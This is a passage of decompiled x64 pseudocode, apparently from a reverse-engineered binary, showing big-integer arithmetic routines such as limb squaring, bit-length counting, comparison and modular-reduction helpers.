  a1[6] = result;
  a1[7] = (v34 < v33)
        + (unsigned __int64)((__int128)(unsigned __int64)v13 >> 63)
        + (result < v34)
        + *((_QWORD *)&v35 + 1);
  return result;
}

//----- (000000013F11BAC0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F11BAC0(_QWORD *a1, unsigned __int64 *a2)
{
  unsigned __int128 v4; // rax
  unsigned __int64 v5; // rt0
  unsigned __int64 v6; // r8
  unsigned __int128 v7; // rax
  bool v8; // cf
  unsigned __int64 v9; // r10
  unsigned __int64 v10; // r11
  __int64 v11; // rbx
  unsigned __int64 v12; // r8
  signed __int128 v13; // rt0
  unsigned __int128 v14; // rax
  unsigned __int64 v15; // r10
  unsigned __int64 v16; // r11
  unsigned __int64 v17; // rcx
  __int64 v18; // rbx
  unsigned __int128 v19; // kr00_16
  unsigned __int128 v20; // rax
  unsigned __int64 v21; // r9
  __int64 v22; // rdi
  unsigned __int64 v23; // rbx
  unsigned __int64 v24; // r10
  __int64 v25; // rdi
  unsigned __int128 v26; // kr10_16
  unsigned __int128 v27; // rax
  __int64 v28; // rbx
  unsigned __int64 v29; // r8
  unsigned __int128 v30; // rax
  unsigned __int64 v31; // r10
  unsigned __int64 v32; // rdi
  unsigned __int64 v33; // rcx
  unsigned __int64 v34; // r11
  __int64 v35; // rbx
  unsigned __int128 v36; // kr20_16
  unsigned __int128 v37; // rax
  unsigned __int64 v38; // r9
  __int64 v39; // rcx
  _BOOL8 v40; // rdi
  unsigned __int128 v41; // rax
  unsigned __int64 v42; // rcx
  unsigned __int64 v43; // r11
  __int64 v44; // rdi
  unsigned __int64 v45; // rbx
  unsigned __int64 v46; // r10
  __int64 v47; // rdi
  unsigned __int128 v48; // kr30_16
  unsigned __int128 v49; // rax
  unsigned __int64 v50; // r8
  __int64 v51; // r9
  _BOOL8 v52; // rsi
  unsigned __int128 v53; // rax
  unsigned __int64 v54; // r9
  unsigned __int64 v55; // r8
  __int64 v56; // rsi
  unsigned __int128 v57; // rax
  unsigned __int64 v58; // r10
  unsigned __int64 v59; // r9
  unsigned __int64 v60; // rdi
  unsigned __int64 v61; // r11
  __int64 v62; // rsi
  unsigned __int128 v63; // kr40_16
  unsigned __int128 v64; // rax
  unsigned __int64 v65; // r8
  __int64 v66; // r9
  _BOOL8 v67; // rbx
  unsigned __int128 v68; // rax
  unsigned __int64 v69; // rcx
  unsigned __int64 v70; // r9
  _BOOL8 v71; // rbx
  unsigned __int128 v72; // rax
  unsigned __int64 v73; // r9
  unsigned __int64 v74; // r11
  __int64 v75; // rbx
  unsigned __int64 v76; // rsi
  unsigned __int64 v77; // r10
  __int64 v78; // rbx
  unsigned __int128 v79; // kr50_16
  unsigned __int128 v80; // rax
  unsigned __int64 v81; // r8
  __int64 v82; // r9
  _BOOL8 v83; // rdi
  unsigned __int128 v84; // rax
  unsigned __int64 v85; // r9
  unsigned __int64 v86; // r8
  __int64 v87; // rdi
  unsigned __int128 v88; // rax
  unsigned __int64 v89; // r10
  unsigned __int64 v90; // r9
  unsigned __int64 v91; // rbx
  unsigned __int64 v92; // r11
  __int64 v93; // rdi
  unsigned __int128 v94; // kr60_16
  unsigned __int128 v95; // rax
  unsigned __int64 v96; // r8
  __int64 v97; // r9
  _BOOL8 v98; // rbx
  unsigned __int128 v99; // rax
  unsigned __int64 v100; // r9
  unsigned __int64 v101; // r11
  __int64 v102; // rbx
  unsigned __int64 v103; // rdi
  unsigned __int64 v104; // r10
  __int64 v105; // rbx
  unsigned __int128 v106; // kr70_16
  unsigned __int128 v107; // rax
  unsigned __int64 v108; // r8
  __int64 v109; // rdi
  unsigned __int128 v110; // rax
  unsigned __int64 v111; // r10
  unsigned __int64 v112; // r9
  unsigned __int64 v113; // rbx
  __int64 v114; // rdi
  unsigned __int128 v115; // kr80_16
  unsigned __int128 v116; // rax
  unsigned __int64 v117; // r11
  __int64 v118; // rbx
  unsigned __int64 v119; // rdi
  unsigned __int64 v120; // r10
  __int64 v121; // rbx
  unsigned __int64 v122; // r8
  unsigned __int128 v123; // rax
  unsigned __int64 v124; // r10
  unsigned __int64 v125; // r9
  unsigned __int64 v126; // rbx
  unsigned __int64 v127; // r11
  unsigned __int64 v128; // rcx
  unsigned __int128 v129; // rax
  unsigned __int64 v130; // r11
  unsigned __int64 v131; // r8
  unsigned __int128 v132; // rax
  unsigned __int64 result; // rax

  v4 = *a2 * (unsigned __int128)*a2;
  *a1 = v4;
  v5 = (*a2 * (unsigned __int128)a2[1]) >> 64;
  v6 = *((_QWORD *)&v4 + 1) + 2 * *a2 * a2[1];
  v7 = *a2 * (unsigned __int128)a2[1] * 2;
  v8 = v6 < 2 * *a2 * a2[1];
  a1[1] = v6;
  v9 = *((_QWORD *)&v7 + 1) + v8;
  v10 = (v9 < v8) + (unsigned __int64)((__int128)v5 >> 63);
  v11 = (__int128)((*a2 * (unsigned __int128)a2[2]) >> 64) >> 63;
  v12 = 2 * *a2 * a2[2];
  v13 = *a2 * (unsigned __int128)a2[2];
  v14 = a2[1] * (unsigned __int128)a2[1];
  *(_QWORD *)&v14 = v12 + v14;
  *((_QWORD *)&v14 + 1) += (unsigned __int64)v14 < v12;
  v15 = v14 + v9;
  a1[2] = v15;
  v16 = (v15 < (unsigned __int64)v14) + v10;
  v17 = (v13 >> 63) + *((_QWORD *)&v14 + 1);
  v18 = (v17 + v16 < v16) + (v17 < *((_QWORD *)&v14 + 1)) + v11;
  v19 = *a2 * (unsigned __int128)a2[3];
  v20 = a2[1] * (unsigned __int128)a2[2];
  *(_QWORD *)&v20 = v19 + v20;
  *((_QWORD *)&v20 + 1) += (unsigned __int64)v20 < (unsigned __int64)v19;
  v21 = v17 + v16 + 2 * v20;
  a1[3] = v21;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v19 + 1) + *((_QWORD *)&v20 + 1) < *((_QWORD *)&v20 + 1);
  *(_QWORD *)&v13 = *((_QWORD *)&v19 + 1) + *((_QWORD *)&v20 + 1);
  v22 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v19 + 1) + *((_QWORD *)&v20 + 1);
  *(_QWORD *)&v13 = v20;
  v23 = (v21 < 2 * (__int64)v20) + v18;
  v24 = (v13 >> 63) + v23;
  v25 = (v24 < v23) + v22;
  v26 = *a2 * (unsigned __int128)a2[4];
  v27 = a2[1] * (unsigned __int128)a2[3];
  *(_QWORD *)&v27 = v26 + v27;
  *((_QWORD *)&v27 + 1) += (unsigned __int64)v27 < (unsigned __int64)v26;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v27 + 1) + *((_QWORD *)&v26 + 1) < *((_QWORD *)&v27 + 1);
  *(_QWORD *)&v13 = *((_QWORD *)&v27 + 1) + *((_QWORD *)&v26 + 1);
  v28 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v27 + 1) + *((_QWORD *)&v26 + 1);
  *(_QWORD *)&v13 = v27;
  v29 = 2 * v27;
  v30 = a2[2] * (unsigned __int128)a2[2];
  *(_QWORD *)&v30 = v29 + v30;
  *((_QWORD *)&v30 + 1) += (unsigned __int64)v30 < v29;
  v31 = v30 + v24;
  a1[4] = v31;
  v32 = (v31 < (unsigned __int64)v30) + v25;
  v33 = (v13 >> 63) + *((_QWORD *)&v30 + 1);
  v34 = v33 + v32;
  v35 = (v33 + v32 < v32) + (v33 < *((_QWORD *)&v30 + 1)) + v28;
  v36 = *a2 * (unsigned __int128)a2[5];
  v37 = a2[1] * (unsigned __int128)a2[4];
  v38 = v36 + v37;
  *((_QWORD *)&v37 + 1) += (_QWORD)v36 + (_QWORD)v37 < (unsigned __int64)v36;
  v39 = *((_QWORD *)&v36 + 1) + *((_QWORD *)&v37 + 1);
  v40 = *((_QWORD *)&v36 + 1) + *((_QWORD *)&v37 + 1) < *((_QWORD *)&v37 + 1);
  v41 = a2[2] * (unsigned __int128)a2[3];
  *(_QWORD *)&v41 = v38 + v41;
  *((_QWORD *)&v41 + 1) += (unsigned __int64)v41 < v38;
  v42 = *((_QWORD *)&v41 + 1) + v39;
  v43 = v34 + 2 * v41;
  a1[5] = v43;
  *((_QWORD *)&v13 + 1) = (v42 < *((_QWORD *)&v41 + 1)) + v40;
  *(_QWORD *)&v13 = v42;
  v44 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v42;
  *(_QWORD *)&v13 = v41;
  v45 = (v43 < 2 * (__int64)v41) + v35;
  v46 = (v13 >> 63) + v45;
  v47 = (v46 < v45) + v44;
  v48 = *a2 * (unsigned __int128)a2[6];
  v49 = a2[1] * (unsigned __int128)a2[5];
  v50 = v48 + v49;
  *((_QWORD *)&v49 + 1) += (_QWORD)v48 + (_QWORD)v49 < (unsigned __int64)v48;
  v51 = *((_QWORD *)&v49 + 1) + *((_QWORD *)&v48 + 1);
  v52 = *((_QWORD *)&v49 + 1) + *((_QWORD *)&v48 + 1) < *((_QWORD *)&v49 + 1);
  v53 = a2[2] * (unsigned __int128)a2[4];
  *(_QWORD *)&v53 = v50 + v53;
  *((_QWORD *)&v53 + 1) += (unsigned __int64)v53 < v50;
  v54 = *((_QWORD *)&v53 + 1) + v51;
  v55 = 2 * v53;
  *((_QWORD *)&v13 + 1) = (v54 < *((_QWORD *)&v53 + 1)) + v52;
  *(_QWORD *)&v13 = v54;
  v56 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v54;
  *(_QWORD *)&v13 = v53;
  v57 = a2[3] * (unsigned __int128)a2[3];
  *(_QWORD *)&v57 = v55 + v57;
  *((_QWORD *)&v57 + 1) += (unsigned __int64)v57 < v55;
  v58 = v57 + v46;
  v59 = *((_QWORD *)&v57 + 1) + (v13 >> 63);
  v60 = (v58 < (unsigned __int64)v57) + v47;
  v61 = v59 + v60;
  a1[6] = v58;
  v62 = (v59 < *((_QWORD *)&v57 + 1)) + (v59 + v60 < v60) + v56;
  v63 = *a2 * (unsigned __int128)a2[7];
  v64 = a2[1] * (unsigned __int128)a2[6];
  v65 = v63 + v64;
  *((_QWORD *)&v64 + 1) += (_QWORD)v63 + (_QWORD)v64 < (unsigned __int64)v63;
  v66 = *((_QWORD *)&v64 + 1) + *((_QWORD *)&v63 + 1);
  v67 = *((_QWORD *)&v64 + 1) + *((_QWORD *)&v63 + 1) < *((_QWORD *)&v64 + 1);
  v68 = a2[2] * (unsigned __int128)a2[5];
  v69 = v65 + v68;
  *((_QWORD *)&v68 + 1) += v65 + (unsigned __int64)v68 < v65;
  v70 = *((_QWORD *)&v68 + 1) + v66;
  v71 = (v70 < *((_QWORD *)&v68 + 1)) + v67;
  v72 = a2[3] * (unsigned __int128)a2[4];
  *(_QWORD *)&v72 = v69 + v72;
  *((_QWORD *)&v72 + 1) += (unsigned __int64)v72 < v69;
  v73 = *((_QWORD *)&v72 + 1) + v70;
  v74 = v61 + 2 * v72;
  a1[7] = v74;
  *((_QWORD *)&v13 + 1) = (v73 < *((_QWORD *)&v72 + 1)) + v71;
  *(_QWORD *)&v13 = v73;
  v75 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v73;
  *(_QWORD *)&v13 = v72;
  v76 = (v74 < 2 * (__int64)v72) + v62;
  v77 = (v13 >> 63) + v76;
  v78 = (v77 < v76) + v75;
  v79 = a2[1] * (unsigned __int128)a2[7];
  v80 = a2[2] * (unsigned __int128)a2[6];
  v81 = v79 + v80;
  *((_QWORD *)&v80 + 1) += (_QWORD)v79 + (_QWORD)v80 < (unsigned __int64)v79;
  v82 = *((_QWORD *)&v80 + 1) + *((_QWORD *)&v79 + 1);
  v83 = *((_QWORD *)&v80 + 1) + *((_QWORD *)&v79 + 1) < *((_QWORD *)&v80 + 1);
  v84 = a2[3] * (unsigned __int128)a2[5];
  *(_QWORD *)&v84 = v81 + v84;
  *((_QWORD *)&v84 + 1) += (unsigned __int64)v84 < v81;
  v85 = *((_QWORD *)&v84 + 1) + v82;
  v86 = 2 * v84;
  *((_QWORD *)&v13 + 1) = (v85 < *((_QWORD *)&v84 + 1)) + v83;
  *(_QWORD *)&v13 = v85;
  v87 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v85;
  *(_QWORD *)&v13 = v84;
  v88 = a2[4] * (unsigned __int128)a2[4];
  *(_QWORD *)&v88 = v86 + v88;
  *((_QWORD *)&v88 + 1) += (unsigned __int64)v88 < v86;
  v89 = v88 + v77;
  v90 = *((_QWORD *)&v88 + 1) + (v13 >> 63);
  v91 = (v89 < (unsigned __int64)v88) + v78;
  v92 = v90 + v91;
  v93 = (v90 < *((_QWORD *)&v88 + 1)) + (v90 + v91 < v91) + v87;
  a1[8] = v89;
  v94 = a2[2] * (unsigned __int128)a2[7];
  v95 = a2[3] * (unsigned __int128)a2[6];
  v96 = v94 + v95;
  *((_QWORD *)&v95 + 1) += (_QWORD)v94 + (_QWORD)v95 < (unsigned __int64)v94;
  v97 = *((_QWORD *)&v95 + 1) + *((_QWORD *)&v94 + 1);
  v98 = *((_QWORD *)&v95 + 1) + *((_QWORD *)&v94 + 1) < *((_QWORD *)&v95 + 1);
  v99 = a2[4] * (unsigned __int128)a2[5];
  *(_QWORD *)&v99 = v96 + v99;
  *((_QWORD *)&v99 + 1) += (unsigned __int64)v99 < v96;
  v100 = *((_QWORD *)&v99 + 1) + v97;
  v101 = v92 + 2 * v99;
  a1[9] = v101;
  *((_QWORD *)&v13 + 1) = (v100 < *((_QWORD *)&v99 + 1)) + v98;
  *(_QWORD *)&v13 = v100;
  v102 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = v100;
  *(_QWORD *)&v13 = v99;
  v103 = (v101 < 2 * (__int64)v99) + v93;
  v104 = (v13 >> 63) + v103;
  v105 = (v104 < v103) + v102;
  v106 = a2[3] * (unsigned __int128)a2[7];
  v107 = a2[4] * (unsigned __int128)a2[6];
  *(_QWORD *)&v107 = v106 + v107;
  *((_QWORD *)&v107 + 1) += (unsigned __int64)v107 < (unsigned __int64)v106;
  v108 = 2 * v107;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v107 + 1) + *((_QWORD *)&v106 + 1) < *((_QWORD *)&v107 + 1);
  *(_QWORD *)&v13 = *((_QWORD *)&v107 + 1) + *((_QWORD *)&v106 + 1);
  v109 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v107 + 1) + *((_QWORD *)&v106 + 1);
  *(_QWORD *)&v13 = v107;
  v110 = a2[5] * (unsigned __int128)a2[5];
  *(_QWORD *)&v110 = v108 + v110;
  *((_QWORD *)&v110 + 1) += (unsigned __int64)v110 < v108;
  v111 = v110 + v104;
  v112 = *((_QWORD *)&v110 + 1) + (v13 >> 63);
  a1[10] = v111;
  v113 = (v111 < (unsigned __int64)v110) + v105;
  v114 = (v112 < *((_QWORD *)&v110 + 1)) + (v112 + v113 < v113) + v109;
  v115 = a2[4] * (unsigned __int128)a2[7];
  v116 = a2[5] * (unsigned __int128)a2[6];
  *(_QWORD *)&v116 = v115 + v116;
  *((_QWORD *)&v116 + 1) += (unsigned __int64)v116 < (unsigned __int64)v115;
  v117 = v112 + v113 + 2 * v116;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v116 + 1) + *((_QWORD *)&v115 + 1) < *((_QWORD *)&v116 + 1);
  *(_QWORD *)&v13 = *((_QWORD *)&v116 + 1) + *((_QWORD *)&v115 + 1);
  v118 = v13 >> 63;
  *((_QWORD *)&v13 + 1) = *((_QWORD *)&v116 + 1) + *((_QWORD *)&v115 + 1);
  *(_QWORD *)&v13 = v116;
  a1[11] = v117;
  v119 = (v117 < 2 * (__int64)v116) + v114;
  v120 = (v13 >> 63) + v119;
  v121 = (v120 < v119) + v118;
  *(_QWORD *)&v13 = (a2[5] * (unsigned __int128)a2[7]) >> 64;
  v122 = 2 * a2[5] * a2[7];
  v123 = a2[6] * (unsigned __int128)a2[6];
  *(_QWORD *)&v123 = v122 + v123;
  *((_QWORD *)&v123 + 1) += (unsigned __int64)v123 < v122;
  v124 = v123 + v120;
  v125 = *((_QWORD *)&v123 + 1) + ((__int128)(a2[5] * (unsigned __int128)a2[7]) >> 63);
  a1[12] = v124;
  v126 = (v124 < (unsigned __int64)v123) + v121;
  v127 = (v125 < *((_QWORD *)&v123 + 1))
       + (v125 + v126 < v126)
       + (unsigned __int64)((__int128)(unsigned __int64)v13 >> 63);
  *(_QWORD *)&v13 = (a2[6] * (unsigned __int128)a2[7]) >> 64;
  v128 = v125 + v126 + 2 * a2[6] * a2[7];
  v129 = a2[6] * (unsigned __int128)a2[7] * 2;
  v8 = v128 < 2 * a2[6] * a2[7];
  a1[13] = v128;
  v130 = v8 + v127;
  v131 = *((_QWORD *)&v129 + 1) + v130;
  v132 = a2[7] * (unsigned __int128)a2[7];
  result = v131 + v132;
  a1[14] = result;
  a1[15] = (v131 < v130)
         + (unsigned __int64)((__int128)(unsigned __int64)v13 >> 63)
         + (result < v131)
         + *((_QWORD *)&v132 + 1);
  return result;
}

//----- (000000013F11BFE0) ----------------------------------------------------
__int64 __fastcall sub_13F11BFE0(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rdx
  _QWORD *v3; // rcx
  __int64 v4; // r8
  unsigned __int64 v5; // r10
  unsigned int v6; // edx
  unsigned int v7; // er9
  unsigned int v8; // ecx

  v1 = *(_QWORD *)(a1 + 24);
  v2 = *(_QWORD *)(a1 + 32);
  if ( v1 )
  {
    v3 = (_QWORD *)(v2 + 8 * (v1 - 1));
    do
    {
      if ( *v3 )
        break;
      --v3;
      --v1;
    }
    while ( v1 );
  }
  if ( !(_DWORD)v1 )
    return 0i64;
  v4 = (unsigned int)(v1 - 1);
  v5 = *(_QWORD *)(v2 + 8 * v4);
  v6 = 0;
  if ( v5 )
  {
    v7 = 0;
    v6 = 64;
    do
    {
      v8 = (v6 + v7) >> 1;
      if ( !(v5 >> v8) )
        v6 = (v6 + v7) >> 1;
      if ( !(v5 >> v8) )
        v8 = v7;
      v7 = v8;
    }
    while ( v6 - v8 > 1 );
  }
  return v6 + ((_DWORD)v4 << 6);
}

//----- (000000013F11C050) ----------------------------------------------------
__int64 __fastcall sub_13F11C050(__int64 a1)
{
  __int64 v1; // rax
  __int64 v2; // rdx
  _QWORD *v3; // rcx
  __int64 v4; // r10
  unsigned __int64 v5; // r9
  unsigned int v6; // edx
  unsigned int v7; // er8
  unsigned int v8; // edx
  unsigned int v9; // ecx

  v1 = *(_QWORD *)(a1 + 24);
  v2 = *(_QWORD *)(a1 + 32);
  if ( v1 )
  {
    v3 = (_QWORD *)(v2 + 8 * (v1 - 1));
    do
    {
      if ( *v3 )
        break;
      --v3;
      --v1;
    }
    while ( v1 );
  }
  if ( !(_DWORD)v1 )
    return 0i64;
  v4 = (unsigned int)(v1 - 1);
  v5 = *(_QWORD *)(v2 + 8 * v4);
  v6 = 0;
  if ( v5 )
  {
    v7 = 0;
    v8 = 64;
    do
    {
      v9 = (v8 + v7) >> 1;
      if ( !(v5 >> v9) )
        v8 = (v8 + v7) >> 1;
      if ( !(v5 >> v9) )
        v9 = v7;
      v7 = v9;
    }
    while ( v8 - v9 > 8 );
    v6 = v8 >> 3;
  }
  return v6 + 8 * (_DWORD)v4;
}

//----- (000000013F11C0C0) ----------------------------------------------------
__int64 __fastcall sub_13F11C0C0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 v9; // rdi
  __int64 v10; // rax
  unsigned __int64 v11; // rcx
  __int64 v12; // rdx
  unsigned __int64 v13; // rcx
  __int64 v14; // rdx
  unsigned __int64 v15; // rcx
  __int64 v16; // rdx
  char v18[16]; // [rsp+38h] [rbp-1A0h] BYREF
  unsigned __int64 v19; // [rsp+48h] [rbp-190h]
  unsigned __int64 v20; // [rsp+50h] [rbp-188h]
  void *v21; // [rsp+58h] [rbp-180h]
  char v22[16]; // [rsp+68h] [rbp-170h] BYREF
  unsigned __int64 v23; // [rsp+78h] [rbp-160h]
  unsigned __int64 v24; // [rsp+80h] [rbp-158h]
  void *v25; // [rsp+88h] [rbp-150h]
  char v26[16]; // [rsp+98h] [rbp-140h] BYREF
  unsigned __int64 v27; // [rsp+A8h] [rbp-130h]
  unsigned __int64 v28; // [rsp+B0h] [rbp-128h]
  void *v29; // [rsp+B8h] [rbp-120h]
  __int64 v30[32]; // [rsp+D0h] [rbp-108h] BYREF

  if ( *(_QWORD *)(a1 + 48) && (**(_BYTE **)(a1 + 56) & 1) != 0 )
  {
    sub_13F112F30((__int64)v30, a1 + 24);
    v9 = sub_13F11C590((__int64)v30, (__int64)v26, a5);
    v10 = sub_13F11C590((__int64)v30, (__int64)v22, a3);
    sub_13F134CA0((__int64)v30, (__int64)v18, v10, a4, v9, a6);
    sub_13F11C6B0((__int64)v30, a2, (__int64)v18);
    v11 = v20;
    if ( v19 < v20 )
      v11 = v19;
    v12 = (__int64)v21;
    if ( v21 )
    {
      memset(v21, 0, 8 * v11);
      sub_13F12E4D0(v12);
    }
    v13 = v24;
    if ( v23 < v24 )
      v13 = v23;
    v14 = (__int64)v25;
    if ( v25 )
    {
      memset(v25, 0, 8 * v13);
      sub_13F12E4D0(v14);
    }
    v15 = v28;
    if ( v27 < v28 )
      v15 = v27;
    v16 = (__int64)v29;
    if ( v29 )
    {
      memset(v29, 0, 8 * v15);
      sub_13F12E4D0(v16);
    }
    sub_13F113450(v30);
  }
  else
  {
    sub_13F134CA0(a1, a2, a3, a4, a5, a6);
  }
  return a2;
}
// 13F11C0C0: using guessed type char var_140[16];
// 13F11C0C0: using guessed type _QWORD var_108[32];
// 13F11C0C0: using guessed type char var_170[16];

//----- (000000013F11C270) ----------------------------------------------------
__int64 __fastcall sub_13F11C270(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  sub_13F134CA0(a1, a2, a3, a4, a5, a6);
  return a2;
}

//----- (000000013F11C2A0) ----------------------------------------------------
__int64 __fastcall sub_13F11C2A0(__int64 a1, __int64 a2)
{
  (*(void (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 8) + 160i64))(*(_QWORD *)(a1 + 8));
  return a2;
}

//----- (000000013F11C2E0) ----------------------------------------------------
__int64 __fastcall sub_13F11C2E0(_QWORD *a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // rsi
  __m128i *v5; // r14
  __m128i *v6; // rax
  __m128i *v7; // r15
  __int64 v8; // rsi
  __int64 result; // rax

  v2 = a1[2];
  if ( a2 <= v2 )
  {
    result = 0x1FFFFFFFFFFFFFFFi64;
    a1[1] = 0x1FFFFFFFFFFFFFFFi64;
  }
  else
  {
    v5 = (__m128i *)a1[3];
    v6 = (__m128i *)sub_13F123740((__int64)a1, a2);
    v7 = v6;
    if ( v5 )
    {
      if ( v6 )
        sub_13F10D330(v6, 8 * v2, v5, 8 * v2);
      memset(v5, 0, 8 * v2);
      sub_13F12E4D0((__int64)v5);
    }
    v8 = a1[2];
    a1[3] = v7;
    sub_13F15EF70((__int64)&v7->m128i_i64[v8], 0, 8 * (a2 - v8));
    result = 0x1FFFFFFFFFFFFFFFi64;
    a1[1] = 0x1FFFFFFFFFFFFFFFi64;
    a1[2] = a2;
  }
  return result;
}

//----- (000000013F11C3B0) ----------------------------------------------------
__int64 __fastcall sub_13F11C3B0(__int64 a1)
{
  __int64 v2; // rax

  v2 = sub_13F14059C(168i64);
  if ( v2 )
    return sub_13F112D70(v2, a1);
  else
    return 0i64;
}

//----- (000000013F11C3F0) ----------------------------------------------------
_QWORD *__fastcall sub_13F11C3F0(_QWORD *a1)
{
  __int64 v2; // rax
  _QWORD *v3; // rbx
  __m128i *v4; // rax
  const __m128i *v5; // r8

  v2 = sub_13F14059C(248i64);
  v3 = (_QWORD *)v2;
  if ( !v2 )
    return 0i64;
  sub_13F112D70(v2, (__int64)a1);
  *v3 = off_13F185448;
  sub_13F112A00((__int64)(v3 + 21), (__int64)(a1 + 21));
  v3[28] = a1[28];
  v3[29] = a1[29];
  v4 = (__m128i *)sub_13F123740((__int64)(v3 + 27), a1[29]);
  v3[30] = v4;
  if ( v4 )
  {
    v5 = (const __m128i *)a1[30];
    if ( v5 )
      sub_13F10D330(v4, 8i64 * v3[29], v5, 8i64 * a1[29]);
  }
  return v3;
}
// 13F185448: using guessed type __int64 (__fastcall *off_13F185448[28])();

//----- (000000013F11C4E0) ----------------------------------------------------
__int64 __fastcall sub_13F11C4E0(__int64 a1, __int64 a2, __int64 a3)
{
  unsigned __int64 *v3; // rax
  __int64 v4; // r9
  unsigned __int64 v5; // rdx

  if ( !a3 )
    return 0i64;
  v3 = (unsigned __int64 *)(a2 + 8 * a3);
  v4 = a1 - a2;
  while ( 1 )
  {
    v5 = *(unsigned __int64 *)((char *)v3-- + v4 - 8);
    --a3;
    if ( v5 > *v3 )
      break;
    if ( v5 < *v3 )
      return 0xFFFFFFFFi64;
    if ( !a3 )
      return 0i64;
  }
  return 1i64;
}

//----- (000000013F11C520) ----------------------------------------------------
__int64 __fastcall sub_13F11C520(__int64 a1, __int64 a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(a2 + 40);
  if ( *(_DWORD *)(a1 + 40) == 1 )
  {
    if ( v2 == 1 )
      return (unsigned int)-sub_13F121140(a1, a2);
    else
      return 0xFFFFFFFFi64;
  }
  else if ( v2 == 1 )
  {
    return 1i64;
  }
  else
  {
    return sub_13F121140(a1, a2);
  }
}

//----- (000000013F11C560) ----------------------------------------------------
__int64 __fastcall sub_13F11C560(__int64 a1, __int64 a2, __int64 a3)
{
  sub_13F11FD00(a3, a2, a1 + 24);
  return a2;
}

//----- (000000013F11C590) ----------------------------------------------------
__int64 __fastcall sub_13F11C590(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v5; // rdi
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rbp
  unsigned __int64 v9; // rcx
  __int64 v10; // rdx
  unsigned __int64 v11; // rcx
  __int64 v12; // rdx
  __int64 v14; // [rsp+30h] [rbp-68h] BYREF
  unsigned __int64 v15; // [rsp+40h] [rbp-58h]
  unsigned __int64 v16; // [rsp+48h] [rbp-50h]
  void *v17; // [rsp+50h] [rbp-48h]
  char v18[16]; // [rsp+60h] [rbp-38h] BYREF
  unsigned __int64 v19; // [rsp+70h] [rbp-28h]
  unsigned __int64 v20; // [rsp+78h] [rbp-20h]
  void *v21; // [rsp+80h] [rbp-18h]

  v5 = *(_QWORD *)(a1 + 48);
  v6 = sub_13F112A00((__int64)&v14, a3);
  v7 = sub_13F114170(v6, v5 << 6);
  v8 = sub_13F112A00((__int64)v18, v7);
  v9 = v16;
  if ( v15 < v16 )
    v9 = v15;
  v10 = (__int64)v17;
  if ( v17 )
  {
    memset(v17, 0, 8 * v9);
    sub_13F12E4D0(v10);
  }
  sub_13F11FD00(v8, a2, a1 + 24);
  v11 = v20;
  if ( v19 < v20 )
    v11 = v19;
  v12 = (__int64)v21;
  if ( v21 )
  {
    memset(v21, 0, 8 * v11);
    sub_13F12E4D0(v12);
  }
  return a2;
}
// 13F11C590: using guessed type char var_38[16];

//----- (000000013F11C690) ----------------------------------------------------
__int64 __fastcall sub_13F11C690(__int64 a1, __int64 a2, __int64 a3)
{
  sub_13F112A00(a2, a3);
  return a2;
}

//----- (000000013F11C6B0) ----------------------------------------------------
__int64 __fastcall sub_13F11C6B0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rax
  const __m128i *v5; // r8
  unsigned __int64 *v7; // rbx
  __m128i *v9; // r15
  unsigned __int64 v10; // r14

  v3 = *(_QWORD *)(a3 + 24);
  v5 = *(const __m128i **)(a3 + 32);
  v7 = *(unsigned __int64 **)(a1 + 240);
  v9 = *(__m128i **)(a1 + 104);
  v10 = *(_QWORD *)(a1 + 48);
  if ( v7 != (unsigned __int64 *)v5 )
  {
    sub_13F10D330(*(__m128i **)(a1 + 240), 8 * v3, v5, 8 * v3);
    v3 = *(_QWORD *)(a3 + 24);
  }
  if ( 2 * v10 != v3 )
    memset(&v7[v3], 0, 8 * (2 * v10 - v3));
  sub_13F120000(v9, &v7[2 * v10], v7, *(unsigned __int64 **)(a1 + 56), *(unsigned __int64 **)(a1 + 200), v10);
  sub_13F112A00(a2, a1 + 72);
  return a2;
}

//----- (000000013F11C770) ----------------------------------------------------
__int64 __fastcall sub_13F11C770(__int64 a1)
{
  __int64 result; // rax

  result = **(unsigned int **)(a1 + 32);
  if ( *(_DWORD *)(a1 + 40) )
    return (unsigned int)-**(_DWORD **)(a1 + 32);
  return result;
}

//----- (000000013F11C790) ----------------------------------------------------
__int64 __fastcall sub_13F11C790(__int64 a1, __int64 a2)
{
  __int64 v3; // rax
  char v5[96]; // [rsp+30h] [rbp-78h] BYREF

  sub_13F10B300((__int64)v5, a2, 2);
  v3 = sub_13F11F9D0(a1, 1);
  sub_13F11D4F0(a1, (__int64)v5, v3, 1);
  sub_13F10D070((__int64)v5);
  return sub_13F10B5E0((__int64)v5);
}

//----- (000000013F11C820) ----------------------------------------------------
__int64 __fastcall sub_13F11C820(__int64 a1, __int64 a2, unsigned __int64 a3, int a4)
{
  unsigned __int64 v5; // rbx
  char v8; // cl
  BOOL v9; // eax
  int v10; // eax
  bool v11; // zf
  __int64 v12; // rax
  __int64 v13; // rcx
  __int64 result; // rax
  unsigned __int64 v15; // rbp
  unsigned __int64 v16; // r14
  _QWORD *v17; // rdx
  unsigned __int64 i; // rdx
  _QWORD *v19; // rdx
  char v20[8]; // [rsp+20h] [rbp-A8h] BYREF
  __int64 v21; // [rsp+28h] [rbp-A0h]
  __m128i v22[2]; // [rsp+30h] [rbp-98h] BYREF
  char pExceptionObject[64]; // [rsp+50h] [rbp-78h] BYREF

  v21 = -2i64;
  v5 = a3;
